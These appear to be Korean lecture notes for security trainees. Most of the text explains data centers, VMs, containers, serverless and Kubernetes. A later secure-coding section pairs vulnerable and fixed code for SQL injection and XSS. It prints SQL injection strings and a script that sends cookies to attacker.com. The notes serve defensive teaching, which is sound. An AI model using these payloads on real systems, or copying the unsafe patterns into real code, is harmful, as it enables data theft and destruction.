# 📚 Part 1: 클라우드 데이터센터의 이해 (오전 특강)

## 1. 데이터센터란 무엇인가?

### 1.1 데이터센터의 정의

> 💡 **중요!** 클라우드는 "뜬구름"이 아닙니다. 실제로는 우리 주변에 있는 물리적인 데이터센터에서 운영되고 있습니다.

**데이터센터(Data Center)**는 서버, 네트워크 장비, 스토리지 등 IT 인프라를 집중적으로 배치하여 24시간 365일 안정적으로 운영하는 시설입니다. 오늘 강의에서는 데이터센터의 실체를 이해하는 것이 보안 전문가로서 첫 걸음이라는 점을 강조하셨습니다.

### 1.2 우리나라의 주요 데이터센터 현황

#### 국내 데이터센터 사업자 분류

우리나라의 데이터센터는 크게 세 가지 카테고리로 분류됩니다:

**1. 통신사(Telco) 계열 데이터센터**
- **SK텔레콤:** 전국 주요 거점에 데이터센터 운영
- **KT:** 대규모 네트워크 인프라와 연계된 데이터센터 보유
- **LG유플러스:** 평촌, 상암, 가산, 서초, 논현 등 수도권 중심의 데이터센터 운영

> 📌 **노트:** 통신사들이 데이터센터를 운영하는 이유는 이미 보유한 네트워크 인프라를 활용하여 "네트워크 + 데이터센터"를 패키지로 제공하기 위함입니다. 다만, 특정 통신사 데이터센터에 입주한다고 해서 반드시 그 통신사의 네트워크만 사용해야 하는 것은 아닙니다.

**2. 대기업 IT 자회사 계열**
- **삼성SDS:** 삼성그룹의 IT 자회사로 데이터센터 운영
- **LG CNS:** LG그룹의 IT 자회사
- **SK C&C (현 AX):** SK그룹의 IT 자회사, 최근 AI 전문화를 표방하며 'AX'로 사명 변경

> 💡 **중요!** 취업을 준비하는 입장에서 이러한 대기업 IT 자회사들의 정확한 명칭을 알아두는 것이 중요합니다. 특히 SK C&C가 AX로 변경된 것처럼 최신 트렌드를 반영한 사명 변경도 주목해야 합니다.

**3. 네트워크 중립적(Network Neutral) 데이터센터**
- **KINX(Korea Internet Neutral eXchange):** 특정 통신사에 종속되지 않고 여러 통신사의 네트워크를 동시에 연결할 수 있는 중립적 데이터센터

이러한 중립적 데이터센터를 선택하면 LG유플러스, KT, SK텔레콤 등 모든 통신사의 네트워크를 자유롭게 선택하고 병행 사용할 수 있습니다.

### 1.3 실제 사건으로 배우는 데이터센터의 중요성

#### 🔥 2022년 SK C&C 판교 데이터센터 화재 사건

강의에서는 첫 번째 퀴즈로 다음 질문이 제시되었습니다:

**Q: 작년에 발생한 대규모 데이터센터 화재 사건은 어디였나요?**

**정답:** SK C&C 판교 데이터센터 화재

이 사건의 핵심 교훈:

1. **데이터센터의 물리적 취약성**
   - 데이터센터는 전력과 냉각 시스템에 절대적으로 의존
   - 화재, 정전 등 물리적 재해에 취약할 수 있음

2. **입주 구조의 이해**
   - SK C&C가 데이터센터를 소유하고 운영
   - **네이버**와 **카카오**가 상면(공간)을 임대하여 입주
   - 한 건물에 여러 회사의 서비스가 공존

3. **DR(Disaster Recovery)의 중요성**
   - **네이버:** DR 센터를 별도로 구축하여 서비스 지속 가능
   - **카카오:** DR이 없어 장시간 서비스 중단 발생
   - **정부 전자 관리 센터:** 단일 데이터센터 운영으로 데이터 손실

> 🔐 **보안 노트:** 데이터센터 차원의 보안은 물리적 보안(화재, 침수, 정전)과 논리적 보안(네트워크, 시스템)을 모두 포함합니다. DR 센터 구축은 비즈니스 연속성 측면에서 필수적인 보안 전략입니다.

## 2. 데이터센터의 물리적 구조

### 2.1 데이터센터 건물의 특징

강의에서 보여주신 데이터센터 건물 사진들의 공통점:

- **창문이 거의 없는 구조:** 서버 장비는 외부 빛이 필요 없으며, 보안상 외부 노출을 최소화
- **공장형 건물:** 대량의 장비를 수용할 수 있는 넓은 공간
- **텔코 회사 로고:** SK, KT, LG 등의 로고가 건물 외벽에 표시됨

> 📌 **노트:** 통신사 로고가 붙어있는 창문 없는 건물을 발견하면 데이터센터일 가능성이 높습니다.

### 2.2 데이터센터의 핵심 인프라

#### 2.2.1 전력 공급 시스템

데이터센터에서 가장 중요한 인프라 중 하나는 **안정적인 전력 공급**입니다:

- **대용량 전력 필요:** 수천 대의 서버를 24시간 가동하려면 엄청난 전력이 필요
- **이중화된 전력선:** 메인 전력선 장애 시에도 백업 전력으로 전환
- **UPS(무정전 전원 공급 장치):** 순간적인 정전에도 서버가 꺼지지 않도록 보호
- **발전기:** 장시간 정전 시에도 자체 전력 생산 가능

#### 2.2.2 냉각(Cooling) 시스템

> 💡 **중요!** 데이터센터에서 전력 다음으로 중요한 것이 바로 **냉각 시스템**입니다.

**냉각이 중요한 이유:**
- 서버들이 밀집 배치되어 엄청난 열 발생
- 특히 **GPU 서버**는 발열량이 극도로 높음 ("GPU가 녹는다"는 표현 사용)
- 적절한 온도 유지 실패 시 서버 다운 및 하드웨어 손상

**냉각 방식:**
1. **기존 방식:** 에어컨을 이용한 공랭식 냉각
2. **최신 트렌드:** 수랭식 냉각, 외기 냉각 등 효율적인 방식 도입

**해외 사례:**
- **Microsoft의 수중 데이터센터 실험:** 바다 밑에 데이터센터를 설치하여 해수로 자연 냉각
  - 장점: 무한한 냉각수, 전력 효율 향상
  - 단점: 해수 온도 상승 우려, 유지보수 어려움

### 2.3 미국 데이터센터의 입지 전략

강의에서 보여주신 미국의 데이터센터 사진은 광활한 평지에 위치한 대규모 시설이었습니다.

**Q: 왜 미국은 이렇게 넓은 땅에 데이터센터를 짓나요?**

**정답:** **땅값(부지 비용)** 때문입니다.

**미국 데이터센터 입지 선정 기준:**

1. **저렴한 땅값**
   - 주정부 차원에서 99년 무상 임대 등 파격적 지원
   - IT 기업 유치를 위한 인센티브

2. **전력 공급**
   - 대규모 전력을 저렴하게 공급받을 수 있는 지역 선호
   - 수력 발전소 인근, 태양광 발전 가능 지역

3. **냉각 용이성**
   - 서늘한 기후 지역 선호 (북부 지역)
   - 강이나 호수 인근 (냉각수 확보)

**한국과의 비교:**
- 한국: 수도권 중심 (서울, 판교, 상암, 가산 등)
- 미국: 외곽 대규모 부지 활용

## 3. 데이터센터 내부 구조

### 3.1 케이지(Cage) 시스템

강의에서 보여주신 데이터센터 내부 사진에는 **철망으로 구획된 공간**들이 있었습니다.

**케이지(Cage)란?**
- 데이터센터 내부를 물리적으로 구획하는 철망 구조물
- 각 입주 기업별로 독립된 공간 제공
- 보안: 다른 회사 직원의 물리적 접근 차단

**케이지의 역할:**
- **물리적 보안:** 권한 없는 인원의 접근 방지
- **공간 분리:** 회사별 독립적인 공간 확보
- **장비 보호:** 실수로 인한 타사 장비 접촉 방지

### 3.2 랙(Rack) 시스템

#### 랙의 정의

**랙(Rack)** 또는 **샤시(Chassis)**:
- 서버와 네트워크 장비를 수직으로 적재하는 표준화된 프레임
- 19인치 너비의 국제 표준

#### 랙의 단위: U (Unit)

강의에서 보여주신 랙에는 **"42U"**라는 표시가 있었습니다.

- **1U = 1 Unit:** 약 1.75인치 (4.445cm) 높이
- **42U 랙:** 42개의 장비를 수직으로 적재할 수 있는 표준 랙
- **서버 크기 표현:** "이 서버는 2U입니다" = 2개의 유닛 공간을 차지

**일반적인 랙 구성 예시:**

```
[42U 랙 구성도]
━━━━━━━━━━━━━━━━━
위쪽 (40-42U): 네트워크 스위치
━━━━━━━━━━━━━━━━━
중간 (10-39U): 컴퓨팅 서버들 (CPU + 메모리)
━━━━━━━━━━━━━━━━━
아래쪽 (1-9U): 스토리지 서버
━━━━━━━━━━━━━━━━━
```

**랙 내부 케이블링:**
- 전원 케이블
- 네트워크 케이블 (이더넷)
- 관리 케이블

> 🔐 **보안 노트:** 랙 단위로 접근 제어를 설정할 수 있으며, 각 랙에는 잠금 장치와 접근 로그 시스템이 있습니다. 물리적 보안의 첫 번째 방어선입니다.

## 4. 애플리케이션 실행 환경의 진화

### 4.1 물리 서버(Physical Server) 시대

#### 물리 서버의 특징

**장점:**
- 최고의 성능 (하드웨어를 100% 활용)
- 다른 시스템과 완전히 격리됨
- 예측 가능한 성능

**단점:**
- **높은 비용:** 서버 한 대당 수천만 원
- **공간 차지:** 물리적 공간 필요
- **전력 소비:** 대량의 전기 사용
- **유연성 부족:** 필요에 따라 빠르게 확장/축소 불가능
- **유지보수:** 하드웨어 고장 시 직접 수리 필요

**비유: 애완동물(Pet)**

> 📌 **노트:** 미국 개발자들은 물리 서버를 "애완동물"에 비유했습니다. 애완동물은 아프면 무조건 치료해서 살려야 하듯이, 물리 서버는 고장 나면 반드시 수리해서 다시 사용해야 했습니다.

### 4.2 가상화(Virtualization)와 VM 시대

#### 가상화 기술의 등장 배경

물리 서버의 단점을 극복하기 위해 **가상화(Virtualization)** 기술이 등장했습니다.

**핵심 아이디어:**
> 하나의 물리 서버 위에 여러 개의 "가상" 서버를 동시에 실행하자!

#### VM(Virtual Machine)의 구조

```
┌─────────────────────────────────────┐
│         VM1         │      VM2      │
│  ┌──────────────┐   │ ┌───────────┐ │
│  │   App        │   │ │   App     │ │
│  ├──────────────┤   │ ├───────────┤ │
│  │  Guest OS    │   │ │ Guest OS  │ │
│  │  (Linux)     │   │ │ (Windows) │ │
│  └──────────────┘   │ └───────────┘ │
├─────────────────────────────────────┤
│        Hypervisor (하이퍼바이저)     │
│      (예: VMware, KVM, Hyper-V)     │
├─────────────────────────────────────┤
│        Host OS (호스트 운영체제)     │
├─────────────────────────────────────┤
│     Physical Hardware (물리 서버)   │
└─────────────────────────────────────┘
```

#### 하이퍼바이저(Hypervisor)

**하이퍼바이저의 역할:**
1. **CPU 할당:** VM1에는 코어 2개, VM2에는 코어 4개
2. **메모리 할당:** VM1에는 8GB, VM2에는 16GB
3. **격리(Isolation):** VM들이 서로 간섭하지 않도록 분리
4. **스케줄링:** CPU 시간을 VM들에게 공정하게 분배

**VM의 장점:**
- **리소스 활용률 향상:** 한 대의 물리 서버에서 여러 서비스 실행
- **빠른 프로비저닝:** 몇 분 안에 새로운 서버 생성 가능
- **스냅샷 기능:** VM 상태를 저장하고 복원 가능
- **이동성:** VM을 다른 물리 서버로 마이그레이션 가능

**VM의 단점:**
- **오버헤드:** 각 VM마다 전체 OS가 필요하여 무거움
- **부팅 시간:** Windows OS를 올리는 데 수 분 소요
- **마이크로서비스 부적합:** 작은 서비스를 수십~수백 개 실행하기엔 무거움

**비유: 가축(Cattle)**

> 📌 **노트:** VM은 "가축"에 비유됩니다. 가축은 병에 걸리면 치료를 시도하지만, 전염병 우려가 있으면 과감히 도태시키고 새로 키웁니다. VM도 문제가 생기면 삭제하고 스크립트로 새로 생성하면 됩니다.

### 4.3 컨테이너(Container) 혁명

#### 컨테이너의 등장 배경

마이크로서비스 아키텍처가 대세가 되면서:
- 하나의 큰 애플리케이션 → 수십~수백 개의 작은 서비스로 분해
- VM은 너무 무거워서 마이크로서비스에 부적합
- 더 가볍고 빠른 격리 기술 필요 → **컨테이너**

#### 컨테이너의 구조

```
┌────────────────────────────────────────┐
│  Container1 │ Container2 │ Container3 │
│  ┌────────┐ │ ┌────────┐ │ ┌────────┐ │
│  │  App   │ │ │  App   │ │ │  App   │ │
│  │  Libs  │ │ │  Libs  │ │ │  Libs  │ │
│  └────────┘ │ └────────┘ │ └────────┘ │
├────────────────────────────────────────┤
│   Container Runtime (예: Docker)       │
├────────────────────────────────────────┤
│   Linux Kernel (cgroups, namespaces)   │
├────────────────────────────────────────┤
│   Host OS (Linux)                      │
├────────────────────────────────────────┤
│   Physical Hardware                    │
└────────────────────────────────────────┘
```

**VM과 컨테이너의 핵심 차이:**

| 구분 | VM | 컨테이너 |
|------|----|----|
| **Guest OS** | 각 VM마다 독립적인 OS | OS 없음 (호스트 커널 공유) |
| **크기** | 수 GB | 수십~수백 MB |
| **부팅 시간** | 수 분 | 수 초 |
| **격리 수준** | 하이퍼바이저로 강력한 격리 | 커널 기능으로 격리 (약간 약함) |
| **밀도** | 물리 서버당 수십 개 | 물리 서버당 수백 개 |

#### Linux 커널의 컨테이너 기술

컨테이너는 하이퍼바이저 없이 **Linux 커널의 두 가지 기능**으로 동작합니다:

**1. Namespaces (네임스페이스)**
- **역할:** 컨테이너들을 서로 격리시킴
- **격리 대상:**
  - PID namespace: 프로세스 ID 공간 분리
  - Network namespace: 네트워크 스택 분리
  - Mount namespace: 파일 시스템 분리
  - User namespace: 사용자 ID 분리

**2. Cgroups (Control Groups)**
- **역할:** 컨테이너에 리소스를 할당하고 제한
- **제어 대상:**
  - CPU: 코어 개수, 사용률 제한
  - Memory: 메모리 용량 제한
  - Disk I/O: 디스크 읽기/쓰기 속도 제한

> 💡 **중요!** 컨테이너는 VM보다 가볍지만, Guest OS가 없기 때문에 모든 컨테이너는 **Linux 커널**을 공유해야 합니다. 따라서 Linux 환경에서만 네이티브로 동작합니다.

### 4.4 Docker와 컨테이너 생태계

#### Docker의 탄생 배경

**컨테이너의 어원:**

강의에서 강조하신 대로, "컨테이너"라는 용어는 물리적인 **화물 컨테이너**에서 유래했습니다.

**말콤 맥린(Malcolm McLean)의 혁명:**

1950년대 이전:
- 부두 노동자들이 각종 화물을 일일이 손으로 옮김
- 화물 종류마다 다른 운반 방식 필요
- 비효율적이고 비용이 많이 듦 (톤당 $5.83)

컨테이너 발명 이후:
- 표준화된 컨테이너에 모든 화물을 담음
- 크레인으로 자동 하역
- 비용 대폭 감소 (톤당 $0.16)

**소프트웨어 컨테이너의 개념:**

물리적 컨테이너처럼:
- 애플리케이션과 모든 의존성을 **하나의 표준 패키지**에 담음
- 어디서든 (개발PC, 테스트 서버, 운영 서버) 동일하게 실행
- 크레인처럼 자동화된 도구로 배포

#### Docker의 핵심 개념

**Docker = 부두(Dock) + 노동자(-er)**

```
[Docker 용어의 해양 테마]
Docker       → 부두 노동자
Container    → 컨테이너 (화물 적재 단위)
Image        → 설계도 (컨테이너를 만드는 템플릿)
Registry     → 컨테이너 창고 (Docker Hub)
Compose      → 여러 컨테이너를 함께 운항
Swarm        → 컨테이너 선단 (여러 배를 조율)
```

#### 컨테이너가 해결한 문제: "내 컴퓨터에서는 되는데요?"

**전통적인 문제 상황:**

```
개발자: "내 로컬에서는 잘 돌아가요!"
운영팀: "근데 서버에서는 안 되는데요?"

원인:
- 개발 환경: Python 3.9, NumPy 1.21.0, Ubuntu 20.04
- 운영 환경: Python 3.7, NumPy 1.19.0, CentOS 7
→ 라이브러리 버전 불일치로 에러 발생
```

**컨테이너 해결 방법:**

```
1. Dockerfile 작성 (모든 의존성 명시)
2. Docker Image 빌드
3. 이미지를 Registry에 업로드
4. 어디서든 동일한 이미지로 컨테이너 실행

→ 개발/테스트/운영 환경이 100% 동일해짐
```

#### 컨테이너의 격리성

**격리된 환경:**
- 각 컨테이너는 독립된 파일 시스템 보유
- 네트워크도 분리됨 (필요시 연결 가능)
- 프로세스도 서로 보이지 않음

**장점:**
```python
# 컨테이너 A: Python 2.7 + Django 1.11
# 컨테이너 B: Python 3.10 + Django 4.2
# → 동일한 서버에서 충돌 없이 공존 가능!
```

**비유: 닭장(Chicken Coop)**

> 📌 **노트:** 컨테이너는 "닭장"에 비유됩니다. 물리 서버(애완동물) → VM(가축) → 컨테이너(닭장)로 갈수록 같은 공간에 더 많은 개체를 밀집시킬 수 있습니다.

### 4.5 서버리스(Serverless): 하루살이의 세계

#### 서버리스의 개념

**퀴즈:** 물리 서버는 애완동물, VM은 가축, 컨테이너는 닭장입니다. 그렇다면 하루살이에 비유되는 실행 환경은?

**정답: 서버리스(Serverless)**

#### 서버리스의 특징

**서버가 없다?**
- 실제로 서버가 없는 것은 아님
- **개발자가 서버를 관리하지 않음**
- 클라우드 제공자(AWS, GCP, Azure)가 서버 관리

**실행 모델:**

```
[기존 서버 모델]
서버 항상 실행 중 → 요청 대기 → 처리 → 다시 대기
└─> 사용하지 않을 때도 비용 발생

[서버리스 모델]
요청 발생 → 함수 실행 → 응답 → 즉시 종료
└─> 실행 시간만큼만 과금
```

**하루살이 비유:**
- 하루살이는 짧게 살다가 죽음
- 서버리스 함수는 요청이 올 때만 "태어났다가" 처리 후 즉시 "죽음"
- 다음 요청이 오면 다시 "태어남"

#### 서버리스의 장점

1. **비용 효율:**
   - 실행 시간만큼만 과금
   - 트래픽 없을 때는 비용 0원

2. **자동 스케일링:**
   - 동시 요청 1000개? → 함수 1000개 자동 생성
   - 트래픽 감소? → 자동으로 축소

3. **관리 부담 제로:**
   - OS 패치, 보안 업데이트 → 클라우드 제공자가 담당
   - 개발자는 코드만 작성

#### 서버리스의 단점

1. **콜드 스타트(Cold Start):**
   - 첫 요청은 함수를 "부팅"하느라 느림 (수백ms ~ 수 초)

2. **실행 시간 제한:**
   - AWS Lambda: 최대 15분
   - 장시간 실행 작업은 부적합

3. **상태 유지 불가:**
   - 각 요청마다 새로운 환경
   - 세션 정보 등은 외부 DB에 저장 필요

#### 서버리스 사용 사례

```python
# 예시: 이미지 업로드 시 썸네일 자동 생성

def lambda_handler(event, context):
    """
    S3에 이미지 업로드 → 이 함수 자동 실행
    """
    # 1. 업로드된 이미지 다운로드
    image = download_from_s3(event['bucket'], event['key'])
    
    # 2. 썸네일 생성
    thumbnail = create_thumbnail(image, width=200, height=200)
    
    # 3. 썸네일 업로드
    upload_to_s3(thumbnail, event['bucket'], 'thumbnails/' + event['key'])
    
    return {'statusCode': 200, 'body': 'Thumbnail created'}

# 이 함수는:
# - 이미지 업로드될 때만 실행됨
# - 처리 완료 후 즉시 종료
# - 다음 업로드 시 다시 실행
```

#### 서버리스의 내부 구조

**Q: 서버리스의 "밑단"은 무엇으로 구성되어 있을까?**

**정답: 컨테이너 (또는 Micro VM)**

```
[AWS Lambda의 실제 구조]
┌──────────────────────────┐
│   사용자 코드 (Python)    │
├──────────────────────────┤
│   Lambda Runtime         │
├──────────────────────────┤
│   Container / Micro VM   │  ← 여기!
├──────────────────────────┤
│   AWS 인프라             │
└──────────────────────────┘
```

- AWS Lambda: **Firecracker** (마이크로 VM)
- Google Cloud Functions: **gVisor** (컨테이너 기반)

**작동 방식:**
1. 요청 도착
2. 빠르게 컨테이너/VM 시작
3. 코드 실행
4. 응답 반환
5. 컨테이너/VM 종료 (또는 일정 시간 유지 후 종료)

## 5. Kubernetes: 컨테이너 오케스트레이션

### 5.1 Kubernetes가 필요한 이유

컨테이너가 편리하지만, 수백~수천 개의 컨테이너를 관리하려면:

**문제점:**
- 어떤 서버에 컨테이너를 배치할까?
- 컨테이너가 죽으면 자동으로 재시작해줄 수 있나?
- 트래픽 증가 시 자동으로 컨테이너를 늘릴 수 있나?
- 컨테이너들끼리 통신은 어떻게 설정하나?

**해결책: Kubernetes (쿠버네티스)**

> 💡 **중요!** Kubernetes는 구글이 15년간 컨테이너 운영 노하우를 오픈소스화한 것입니다.

### 5.2 Kubernetes의 발음과 약어

**정식 발음:**
- 그리스어 Κυβερνήτης (키베르네테스)
- 영어권에서는 "쿠버네티스" 또는 "큐버네티스"

**약어: K8s**
- **K**ubernete**s** → 가운데 8글자 → **K8s**
- 비슷한 예: **O11y** (Observability, 가운데 11글자)

### 5.3 Kubernetes의 핵심 개념

#### 오케스트레이션(Orchestration)이란?

```
[물리적 컨테이너 선적 비유]
컨테이너 선:
- 1000개의 컨테이너 적재
- 크레인이 자동으로 컨테이너를 싣고 내림
- 목적지별로 최적 배치

Kubernetes:
- 1000개의 애플리케이션 컨테이너 관리
- 자동으로 서버에 배치
- 부하에 따라 최적 배치
```

#### Kubernetes의 기본 아키텍처

```
┌─────────────────────────────────────────┐
│        Control Plane (마스터)            │
│  - API Server: 명령 접수              │
│  - Scheduler: 어디에 배치할지 결정      │
│  - Controller: 원하는 상태 유지         │
│  - etcd: 클러스터 데이터 저장           │
└────────┬────────────────────────────────┘
         │
    ┌────┴────┬────────┬────────┐
    │         │        │        │
┌───▼───┐ ┌──▼───┐ ┌──▼───┐ ┌──▼───┐
│Worker │ │Worker│ │Worker│ │Worker│
│Node 1 │ │Node 2│ │Node 3│ │Node 4│
│       │ │      │ │      │ │      │
│Kubelet│ │Kubelet│ │Kubelet│ │Kubelet│
│(에이전트)│ │      │ │      │ │      │
│       │ │      │ │      │ │      │
│[Pod]  │ │[Pod] │ │[Pod] │ │[Pod] │
│[Pod]  │ │[Pod] │ │      │ │[Pod] │
└───────┘ └──────┘ └──────┘ └──────┘
```

### 5.4 Kubernetes 작동 방식 (쉬운 예시)

#### 예시: 쇼핑몰 애플리케이션 배포

**목표:**
```
Database 서버: 1대
Web 서버: 2대
Application 서버: 5대
Cache 서버: 1대
```

#### YAML 파일로 선언

```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: shopping-mall-app
spec:
  replicas: 5  # 5대 실행하고 싶음
  selector:
    matchLabels:
      app: shopping-app
  template:
    metadata:
      labels:
        app: shopping-app
    spec:
      containers:
      - name: app-server
        image: mycompany/shopping-app:1.0  # 도커 이미지
        ports:
        - containerPort: 8080
```

#### Kubernetes의 마법

**1단계: 사용자가 명령**
```bash
kubectl apply -f deployment.yaml
```

**2단계: Control Plane이 결정**
```
Control Plane 생각:
"5개가 필요하네? 지금 Worker Node 상태 확인해볼까?"
- Node 1: CPU 30%, Memory 50%
- Node 2: CPU 80%, Memory 70% (부하 높음)
- Node 3: CPU 20%, Memory 30%
- Node 4: CPU 40%, Memory 40%

"Node 3이 가장 여유롭네. 거기에 2개 배치하고,
 Node 1에 2개, Node 4에 1개 배치하자."
```

**3단계: Kubelet이 실행**
```
각 Worker Node의 Kubelet:
1. Docker Hub에서 이미지 다운로드
2. 컨테이너 실행
3. 상태 보고 "컨테이너 정상 실행 중입니다!"
```

**4단계: 자가 치유(Self-Healing)**
```
[10분 후]
Node 1의 컨테이너 1개 크래시!

Kubelet → Control Plane 보고:
"컨테이너 하나 죽었습니다!"

Control Plane 판단:
"5개를 원했는데 4개만 살아있네? 하나 더 띄워야겠다."
"Node 3에 여유 있으니 거기에 배치!"

Kubelet → 새 컨테이너 실행
```

#### 실제 활용 시나리오

```
[블랙 프라이데이 세일]

세일 시작: 10,000 RPS

Kubernetes Auto-Scaling:

   5개 → 20개 → 50개 → 100개

   트래픽 감소 감지 → 다시 5개로 축소

```

### 8.2 입력값 검증 (Input Validation)

#### 왜 입력값을 검증해야 하나?

**핵심 원칙:**
> 사용자가 입력한 데이터를 절대 신뢰하지 마라!

#### 취약한 코드 예시

```python
# ❌ 취약한 코드 (검증 없음)
def process_user_age(age_input):
    age = int(age_input)  # 무조건 int로 변환 시도
    
    if age >= 18:
        return "성인입니다"
    else:
        return "미성년자입니다"

# 사용자가 악의적 입력을 하면?
result = process_user_age("100000000000000000000")  # OverflowError
result = process_user_age("abc")  # ValueError
result = process_user_age("'; DROP TABLE users; --")  # SQL 인젝션 시도
```

**문제점:**
1. 예상하지 못한 입력에 프로그램 크래시
2. 악의적 입력으로 공격 가능
3. 데이터 무결성 손상

#### 💻 안전한 코드 구현

```python
# ✅ 안전한 코드 (검증 포함)
def process_user_age_safe(age_input):
    """
    사용자 나이 입력을 안전하게 처리
    
    Args:
        age_input (str): 사용자가 입력한 나이
        
    Returns:
        str: 처리 결과 메시지
    """
    # 1단계: 타입 검증
    if not isinstance(age_input, str):
        return "ERROR: 입력값은 문자열이어야 합니다"
    
    # 2단계: 빈 문자열 검사
    if not age_input.strip():
        return "ERROR: 나이를 입력해주세요"
    
    # 3단계: 숫자 변환 가능 여부 확인
    try:
        age = int(age_input)
    except ValueError:
        return f"ERROR: '{age_input}'는 유효한 숫자가 아닙니다"
    
    # 4단계: 범위 검증
    if age < 0:
        return "ERROR: 나이는 음수일 수 없습니다"
    if age > 150:
        return "ERROR: 유효하지 않은 나이입니다"
    
    # 5단계: 정상 처리
    if age >= 18:
        return f"나이 {age}세: 성인입니다"
    else:
        return f"나이 {age}세: 미성년자입니다"

# 테스트
print(process_user_age_safe("25"))      # 정상
print(process_user_age_safe("-5"))      # 음수 거부
print(process_user_age_safe("abc"))     # 문자 거부
print(process_user_age_safe("99999"))   # 범위 초과 거부
```

#### 💻 코드 실행 상세 분석

**1단계: 타입 검증**
```python
if not isinstance(age_input, str):
```
- `isinstance()` 함수로 입력값이 문자열인지 확인
- 예상치 못한 타입(int, list, dict 등) 조기 차단

**2단계: 빈 문자열 검사**
```python
if not age_input.strip():
```
- `strip()` 메서드로 양쪽 공백 제거
- 공백만 있거나 빈 문자열이면 거부

**3단계: 숫자 변환 시도**
```python
try:
    age = int(age_input)
except ValueError:
    return "ERROR..."
```
- `try-except` 블록으로 변환 실패 처리
- `ValueError` 발생 시 프로그램 크래시 방지

**4단계: 범위 검증**
```python
if age < 0 or age > 150:
```
- 비즈니스 로직에 맞는 범위 설정
- 현실적으로 불가능한 값 거부

**5단계: 정상 처리**
```python
return f"나이 {age}세: 성인입니다"
```
- 모든 검증을 통과한 안전한 값으로 비즈니스 로직 수행

> 🔐 **보안 노트:** 입력값 검증은 "화이트리스트" 방식이 더 안전합니다. 즉, "금지된 것을 막는다"보다 "허용된 것만 통과시킨다"는 관점입니다.

### 8.3 SQL 인젝션 방어

#### SQL 인젝션이란?

**정의:**
악의적인 SQL 쿼리를 삽입하여 데이터베이스를 조작하거나 정보를 탈취하는 공격

#### 취약한 코드 예시

```python
import sqlite3

# ❌ 위험한 코드 (SQL 인젝션 취약)
def get_user_by_name_vulnerable(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # 사용자 입력을 직접 쿼리에 삽입 (매우 위험!)
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    
    result = cursor.fetchone()
    conn.close()
    return result

# 정상 사용
user = get_user_by_name_vulnerable("john")
# 실행되는 쿼리: SELECT * FROM users WHERE username = 'john'

# 악의적 사용 (SQL 인젝션 공격)
attacker_input = "admin' OR '1'='1"
user = get_user_by_name_vulnerable(attacker_input)
# 실행되는 쿼리: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# → 모든 사용자 정보 노출!

# 더 심각한 공격
attacker_input2 = "admin'; DROP TABLE users; --"
# 실행되는 쿼리: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
# → users 테이블 삭제!
```

#### 💻 안전한 코드 구현

```python
import sqlite3

# ✅ 안전한 코드 (Parameterized Query 사용)
def get_user_by_name_safe(username):
    """
    SQL 인젝션으로부터 안전한 사용자 조회
    
    Args:
        username (str): 조회할 사용자명
        
    Returns:
        tuple: 사용자 정보 (없으면 None)
    """
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # Parameterized Query (플레이스홀더 사용)
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))  # 튜플로 전달
    
    result = cursor.fetchone()
    conn.close()
    return result

# 정상 사용
user = get_user_by_name_safe("john")
# 내부적으로 username이 이스케이프 처리됨

# 악의적 입력 시도
attacker_input = "admin' OR '1'='1"
user = get_user_by_name_safe(attacker_input)
# 쿼리: SELECT * FROM users WHERE username = 'admin'' OR ''1''=''1'
# → 문자 그대로 검색되어 공격 실패
```

#### 💻 코드 실행 상세 분석

**안전하지 않은 방식 (문자열 포맷팅):**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```
1. Python이 문자열 포맷팅을 먼저 수행
2. 결과: `"SELECT * FROM users WHERE username = 'admin' OR '1'='1'"`
3. 데이터베이스가 이를 유효한 SQL로 해석
4. `OR '1'='1'`은 항상 참 → 모든 레코드 반환

**안전한 방식 (Parameterized Query):**
```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```
1. `?`는 플레이스홀더 (값이 들어갈 자리 표시)
2. `cursor.execute()`에 쿼리와 값을 분리하여 전달
3. 데이터베이스 드라이버가 값을 안전하게 이스케이프 처리
4. `'` 같은 특수 문자가 `''`로 자동 변환
5. SQL 구문으로 해석되지 않고 단순 데이터로 처리

**이스케이프 처리 예시:**
```
입력: admin' OR '1'='1
이스케이프 후: admin'' OR ''1''=''1
→ 문자 그대로 검색 (SQL 구문 X)
```

> 🔐 **보안 노트:** 
> 1. **절대 문자열 포맷팅으로 SQL 작성 금지** (`f-string`, `%`, `+` 사용 금지)
> 2. **항상 Parameterized Query 사용** (Python의 `?`, `:name` 또는 ORM 사용)
> 3. **ORM(SQLAlchemy, Django ORM) 사용 권장** (자동으로 안전하게 처리)

### 8.4 XSS (Cross-Site Scripting) 방어

#### XSS란?

**정의:**
악의적인 스크립트(주로 JavaScript)를 웹페이지에 삽입하여 다른 사용자의 정보를 탈취하거나 악의적 행동을 수행하게 하는 공격

#### 취약한 코드 예시 (Flask 웹 앱)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

# ❌ 위험한 코드 (XSS 취약)
@app.route('/comment', methods=['POST'])
def add_comment_vulnerable():
    user_comment = request.form['comment']
    
    # 사용자 입력을 그대로 HTML에 삽입
    html = f"""
    <html>
        <body>
            <h1>댓글:</h1>
            <p>{user_comment}</p>
        </body>
    </html>
    """
    return render_template_string(html)

# 정상 입력
# comment = "좋은 글이네요!"
# → 출력: <p>좋은 글이네요!</p>

# 악의적 입력 (XSS 공격)
# comment = "<script>alert('XSS 공격!');</script>"
# → 출력: <p><script>alert('XSS 공격!');</script></p>
# → 스크립트가 실행되어 경고창 표시

# 더 심각한 공격
# comment = "<script>
#   fetch('http://attacker.com/steal?cookie=' + document.cookie);
# </script>"
# → 사용자의 쿠키 정보를 공격자 서버로 전송
```

#### 💻 안전한 코드 구현

```python
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)

# ✅ 안전한 코드 (HTML 이스케이프 적용)
@app.route('/comment', methods=['POST'])
def add_comment_safe():
    user_comment = request.form['comment']
    
    # HTML 특수 문자를 이스케이프 처리
    safe_comment = html.escape(user_comment)
    
    html_content = f"""
    <html>
        <body>
            <h1>댓글:</h1>
            <p>{safe_comment}</p>
        </body>
    </html>
    """
    return render_template_string(html_content)

# 악의적 입력 시도
# comment = "<script>alert('XSS');</script>"
